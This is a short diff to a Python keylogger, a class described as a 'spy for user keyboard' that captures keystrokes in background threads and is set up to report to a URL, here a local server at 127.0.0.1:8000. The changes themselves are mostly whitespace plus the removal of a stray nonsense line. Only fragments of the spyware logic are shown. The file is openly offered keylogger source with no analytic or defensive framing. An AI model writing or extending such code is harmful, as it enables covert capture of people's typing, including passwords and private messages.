@@ -10,6 +10,7 @@ import configparser
 
 class KeyLogger():
     '''spy for user keyboard'''
+    
     def __init__(self, filename, url):
         self.__log = []
         self.__keylogger_result = ''
@@ -42,7 +43,7 @@ class KeyLogger():
                 elif not i in black_list:
                     self.__keylogger_result += i
             time.sleep(1)
-hello world and now i tell you sitdown
+
     @staticmethod
     def __read_data_from_file(file):
         with open(file, 'r') as file:
@@ -114,6 +115,7 @@ hello world and now i tell you sitdown
             self.__id = self.__restore_id()
         else:
             self.__id = self.__get_id()
+
     def mainloop(self):
         '''divide kelogger's logic to treads'''
         self.__inital_doing()
@@ -123,6 +125,8 @@ hello world and now i tell you sitdown
         log_thread.start()
         parse_log_tread.start()
         save_tread.start()
+
+
 if __name__ == "__main__":
     keylogger = KeyLogger('log.data', 'http://127.0.0.1:8000')
     keylogger.mainloop()
